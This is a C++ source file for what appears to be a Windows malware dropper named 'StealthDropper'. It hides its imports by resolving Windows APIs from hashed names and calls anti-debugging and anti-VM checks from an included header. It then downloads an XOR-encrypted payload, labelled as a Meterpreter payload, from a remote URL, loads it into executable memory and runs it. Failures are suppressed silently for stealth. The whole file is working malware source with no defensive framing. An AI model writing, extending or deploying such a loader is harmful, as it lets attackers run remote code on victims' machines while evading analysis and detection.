#include <windows.h>
#include <iostream>
#include <vector>
#include <random>
#include <string>
#include <wininet.h>
#include "antiv5.h" // Include the anti-debugging and anti-VM detection file

#pragma comment(lib, "wininet.lib")

// Function to calculate hashes for obfuscation
constexpr DWORD calculateHash(const char* str) {
    DWORD hash = 0;
    while (*str) {
        hash = (hash >> 13) | (hash << 19); // Rotate right
        hash += *str++;
    }
    return hash;
}

// Hash values for dynamic resolution
constexpr DWORD HASH_VirtualAlloc = calculateHash("VirtualAlloc");
constexpr DWORD HASH_VirtualFree = calculateHash("VirtualFree");
constexpr DWORD HASH_InternetOpen = calculateHash("InternetOpen");
constexpr DWORD HASH_InternetOpenUrl = calculateHash("InternetOpenUrl");
constexpr DWORD HASH_InternetReadFile = calculateHash("InternetReadFile");
constexpr DWORD HASH_InternetCloseHandle = calculateHash("InternetCloseHandle");

// Function to dynamically resolve API addresses
FARPROC resolveAPI(const HMODULE module, DWORD hash) {
    auto base = reinterpret_cast<const BYTE*>(module);
    auto dosHeader = reinterpret_cast<const IMAGE_DOS_HEADER*>(base);
    auto ntHeader = reinterpret_cast<const IMAGE_NT_HEADERS*>(base + dosHeader->e_lfanew);

    auto exportDirRVA = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!exportDirRVA) return nullptr;

    auto exportDir = reinterpret_cast<const IMAGE_EXPORT_DIRECTORY*>(base + exportDirRVA);
    auto names = reinterpret_cast<const DWORD*>(base + exportDir->AddressOfNames);
    auto functions = reinterpret_cast<const DWORD*>(base + exportDir->AddressOfFunctions);
    auto ordinals = reinterpret_cast<const WORD*>(base + exportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exportDir->NumberOfNames; ++i) {
        const char* name = reinterpret_cast<const char*>(base + names[i]);
        if (calculateHash(name) == hash) {
            return reinterpret_cast<FARPROC>(base + functions[ordinals[i]]);
        }
    }

    return nullptr;
}

// Wrapper for direct syscalls
#define SYSCALL_WRAPPER(name, ...) \
    reinterpret_cast<decltype(&name)>(resolveAPI(GetModuleHandle(TEXT("kernel32.dll")), HASH_##name))(__VA_ARGS__)

// Decrypt the payload (simple XOR decryption)
void decryptPayload(std::vector<char>& payload, char key) {
    for (auto& byte : payload) {
        byte ^= key;
    }
}

void downloadAndExecutePayload(const std::string& url, char decryptionKey) {
    auto hInternet = SYSCALL_WRAPPER(InternetOpen, "StealthDropper", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) return;

    auto hConnect = SYSCALL_WRAPPER(InternetOpenUrl, hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hConnect) {
        SYSCALL_WRAPPER(InternetCloseHandle, hInternet);
        return;
    }

    std::vector<char> payload;
    char buffer[4096];
    DWORD bytesRead;

    while (SYSCALL_WRAPPER(InternetReadFile, hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        payload.insert(payload.end(), buffer, buffer + bytesRead);
    }

    SYSCALL_WRAPPER(InternetCloseHandle, hConnect);
    SYSCALL_WRAPPER(InternetCloseHandle, hInternet);

    if (payload.empty()) return;

    decryptPayload(payload, decryptionKey);

    void* execMem = SYSCALL_WRAPPER(VirtualAlloc, NULL, payload.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!execMem) return;

    memcpy(execMem, payload.data(), payload.size());
    reinterpret_cast<void(*)()>(execMem)();

    SYSCALL_WRAPPER(VirtualFree, execMem, 0, MEM_RELEASE);
}

int main() {
    try {
        anti();
        std::string payloadUrl = "http://example.com/meterpreter_payload.bin";
        char decryptionKey = 0x5A; // Example decryption key
        downloadAndExecutePayload(payloadUrl, decryptionKey);
    } catch (...) {
        // Fail silently for stealth
    }

    return 0;
}
